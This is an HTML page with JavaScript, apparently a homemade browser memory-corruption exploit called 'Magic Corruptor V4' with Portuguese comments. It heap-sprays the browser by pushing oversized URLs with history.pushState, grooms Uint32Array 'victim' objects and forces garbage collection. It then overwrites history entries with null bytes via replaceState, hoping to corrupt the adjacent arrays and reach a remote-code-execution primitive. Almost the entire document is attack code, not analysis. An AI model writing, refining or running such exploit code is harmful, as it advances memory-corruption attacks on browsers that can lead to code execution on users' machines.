<!DOCTYPE html>
<html>
<head>
    <title>Magic Corruptor V4 (Replace Trigger)</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.1em; cursor: pointer; 
            background: #1a1a1a; color: #fff; border: 2px solid #00ff00; margin: 5px; width: 45%;
        }
        .btn-red { border-color: #ff3333; color: #ff3333; }
        .btn:hover { background: #333; }
        .win { background-color: #004400; color: #fff; font-weight: bold; padding: 5px; border: 1px solid #0f0; }
    </style>
</head>
<body>

<h1>Magic Corruptor V4</h1>
<p>Correção: Usando replaceState para contornar limite de memória.</p>

<button class="btn" onclick="runPhase1()">1. SATURAR MEMÓRIA (Spray)</button>
<button class="btn" onclick="forceGC()">2. COMPACTAR (GC)</button>
<br>
<button class="btn btn-red" onclick="runPhase2()" style="width: 92%">3. ESMAGAR (Replace 128 Zeros)</button>

<div id="log">Pronto.</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : (type === 'err' ? '#ff5555' : '#00ff00');
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    function makeGroomPayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    // --- FASE 1: SPRAY DE ESCOPETA (SATURAÇÃO) ---
    async function runPhase1() {
        log("=== CARREGANDO MUNIÇÃO... ===", 'win');
        victims = [];
        
        // Reduzimos levemente o limite para garantir que o último push entre
        const MAX_SIZE = 42000; 
        
        try {
            for(let size = 1000; size <= MAX_SIZE; size += 1000) {
                
                // 1. Grooming
                let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
                
                try {
                    history.pushState({}, `groom_${size}`, payload);
                } catch(e) {
                    log(`[!] Memória cheia em ${size} bytes. Isso é BOM. Parando spray.`);
                    break; 
                }
                
                // 2. VÍTIMAS (Shotgun)
                // Colocamos as vítimas logo após o histórico
                
                // Pequeno (32 ints = 128 bytes)
                let v1 = new Uint32Array(32); 
                v1.fill(0x11111111); v1.tag = "Small"; v1.idx = size;
                victims.push(v1);

                // Médio (256 ints = 1KB)
                let v2 = new Uint32Array(256); 
                v2.fill(0x22222222); v2.tag = "Medium"; v2.idx = size;
                victims.push(v2);

                if(size % 5000 === 0) {
                    log(`    ...${size} bytes (Vítimas: ${victims.length})`);
                    await wait(20); 
                }
            }
        } catch(e) {
            log(`[!] Erro fatal no spray: ${e.message}`, 'err');
        }
        
        log("MEMÓRIA SATURADA. Agora clique em COMPACTAR.", 'win');
    }

    // --- FASE EXTRA: FORCE GC ---
    async function forceGC() {
        log("Compactando (Assentando tijolos)...");
        try {
            // Aloca e libera rápido para o GC organizar os espaços
            let a = [];
            for(let i=0; i<50; i++) a.push(new ArrayBuffer(1024 * 1024));
            a = null; 
            await wait(300);
        } catch(e) {}
        log("Pronto. O último objeto no histórico está colado na última vítima.", 'win');
    }

    // --- FASE 2: ATAQUE (REPLACE) ---
    async function runPhase2() {
        log("=== DISPARANDO (REPLACE STATE) ===", 'win');
        let success = false;
        
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); // 128 Zeros
            
            // AQUI ESTÁ A MUDANÇA: replaceState
            // Substituímos a entrada atual (que está no topo da pilha, colada na vítima)
            // pelo payload de ataque.
            
            log("Enviando payload...");
            
            // Dispara rajada de replace
            for(let k=0; k<10; k++) {
                history.replaceState({}, `PWN_${k}`, "/" + buffer + attack);
            }
            await wait(200);
            
            log("Verificando danos em " + victims.length + " vítimas...");
            
            // VERIFICAÇÃO
            for(let i=victims.length - 1; i >= 0; i--) { // Checa do fim para o começo (mais chance)
                let v = victims[i];
                if (!v) continue;

                // 1. Checa Tamanho (Header Corruption)
                // Se zeramos o header, o tamanho muda para 0 ou um número gigante
                if (v.length !== (v.tag === "Small" ? 32 : 256)) {
                    log(`!!! JACKPOT !!! [${v.tag}] Index ${i} TAMANHO MUDOU: ${v.length}`, 'win');
                    success = true;
                }
                
                // 2. Checa Conteúdo (Data Corruption)
                let expected = v.tag === "Small" ? 0x11111111 : 0x22222222;
                if (v[0] !== expected) {
                    log(`!!! JACKPOT !!! [${v.tag}] Index ${i} CONTEÚDO ZERADO! Valor: 0x${v[0].toString(16)}`, 'win');
                    success = true;
                }

                if (success) break;
            }
            
            if(success) {
                alert("RCE PRIMITIVE UNLOCKED!\nTire foto e não feche o navegador!");
            } else {
                log("[-] Nenhuma corrupção detectada. O payload foi escrito, mas talvez o alinhamento 0x00-0x20 precise de ajuste.");
            }

        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`, 'err');
            if(e.message.includes("allowed")) {
                log("    [Dica] A memória ainda está muito cheia. Tente reiniciar o console.", 'win');
            }
        }
    }
</script>
</body>
</html>
